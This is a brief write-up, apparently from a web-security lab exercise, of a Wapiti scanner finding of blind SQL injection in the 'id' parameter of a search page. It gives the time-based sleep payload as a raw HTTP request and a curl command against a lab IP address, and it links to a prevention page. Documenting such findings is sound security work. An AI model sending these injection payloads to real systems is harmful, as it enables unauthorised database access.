# SQL Injection /?page=searchimg

## Wapiti Report
Blind SQL vulnerability via injection in the parameter id
`GET /?page=searchimg&id=sleep%287%29%231&Submit=Submit HTTP/1.1`
Host: 10.13.200.53
Referer: http://10.13.200.53/?page=searchimg
curl "http://10.13.200.53/?page=searchimg&id=sleep%287%29%231&Submit=Submit" -e "http://10.13.200.53/?page=searchimg"

## Prevention 
See: [SQL Injection Prevention](../../sql_injection_member/Resources/sql_injection_member.md#prevention)
